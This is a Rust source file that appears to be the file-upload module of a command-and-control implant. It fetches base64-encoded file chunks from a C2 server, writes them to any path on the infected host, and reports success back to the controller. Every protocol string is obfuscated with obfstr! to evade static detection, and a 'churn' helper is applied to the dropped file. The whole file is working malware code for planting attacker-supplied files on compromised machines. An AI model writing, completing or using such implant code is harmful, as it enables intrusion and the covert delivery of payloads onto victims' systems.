use serde::Deserialize;
use serde_json::Value;
use std::{fs::File, io::Write, path::PathBuf};
use base64::engine::general_purpose;
use base64::Engine;
use obfstr::obfstr;

use crate::config;

#[derive(Deserialize)]
struct UploadParams {
    file_id: String,
    remote_path: String,
}

pub fn upload(task: &Value) -> Result<(), Box<dyn std::error::Error>> {
    // 1. Extract and validate fields
    let id = task.get("id")
        .and_then(Value::as_str)
        .ok_or("Missing `id` in task JSON")?;
    let raw_params = task.get("parameters")
        .and_then(Value::as_str)
        .ok_or("Missing `parameters` in task JSON")?;
    let params: UploadParams = serde_json::from_str(raw_params)?;

    // 2. Resolve the output path
    let mut path = PathBuf::from(&params.remote_path);
    if !path.is_absolute() {
        path = std::env::current_dir()?.join(&params.remote_path);
    }

    // 3. Open file for writing
    let mut f = File::create(&path)?;
    let mut chunk_num = 1;
    let mut total_chunks = 1;

    // 4. Download all chunks
    while chunk_num <= total_chunks {
        let payload = serde_json::json!({
            obfstr!("action"): obfstr!("post_response"),
            obfstr!("responses"): [{
                obfstr!("upload"): {
                    obfstr!("chunk_size"): config::chunk_size,
                    obfstr!("file_id"): params.file_id,
                    obfstr!("chunk_num"): chunk_num,
                    obfstr!("full_path"): path.to_string_lossy()
                },
                obfstr!("task_id"): id,
                obfstr!("completed"): true
            }]
        })
        .to_string();

        let resp: Value = crate::transport::send_request_with_response(&payload)?;
        let entry = resp.get(obfstr!("responses"))
            .and_then(Value::as_array)
            .and_then(|arr| arr.get(0))
            .ok_or("Missing responses[0] in C2 reply")?;

        total_chunks = entry.get(obfstr!("total_chunks"))
            .and_then(Value::as_u64)
            .ok_or("Missing or invalid `total_chunks`")? as usize;
        let chunk_data = entry.get(obfstr!("chunk_data"))
            .and_then(Value::as_str)
            .ok_or("Missing `chunk_data`")?;

        let bytes = general_purpose::STANDARD.decode(chunk_data)?;
        f.write_all(&bytes)?;

        chunk_num += 1;
    }
    crate::helpers::churn(path.to_string_lossy().as_ref());

    // 5. Send final success
    let resp_json = serde_json::json!({
        obfstr!("action"): obfstr!("post_response"),
        obfstr!("responses"): [{
            obfstr!("task_id"): id,
            obfstr!("user_output"): format!("Wrote {} chunks to {}", total_chunks, path.display()),
            obfstr!("status"): obfstr!("success"),
            obfstr!("completed"): true
        }]
    })
    .to_string();
    crate::transport::send_request(&resp_json)?;

    Ok(())
}
